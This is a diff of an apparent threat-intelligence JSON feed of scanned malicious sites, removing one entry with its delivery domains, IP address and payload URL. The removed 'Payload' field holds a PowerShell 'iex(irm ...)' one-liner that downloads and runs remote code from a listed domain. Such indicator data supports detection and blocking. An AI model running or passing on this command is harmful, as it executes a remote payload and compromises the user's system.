@@ -8887,27 +8887,5 @@
     ],
     "ReportId": "cmw9s0e8w050u0oml3hvppp7a",
     "ScannedAt": "2026-11-09T21:31:27.980000+00:00"
-  },
-  {
-    "UrlDomain": "bergiedigital.com",
-    "DeliveryUrl": [
-      "copiose.org",
-      "sky.dolcefantasia.us",
-      "yaponovosh.org",
-      "cloudeccentric.cc"
-    ],
-    "PayloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "IP": [
-      "160.153.0.24"
-    ],
-    "Related": [],
-    "Payload": "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
-    "ResolvedDownloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "ReportId": "cmw9qc8do03h30omlv9zigk19",
-    "ScannedAt": "2026-11-09T20:44:40.970000+00:00"
   }
 ]
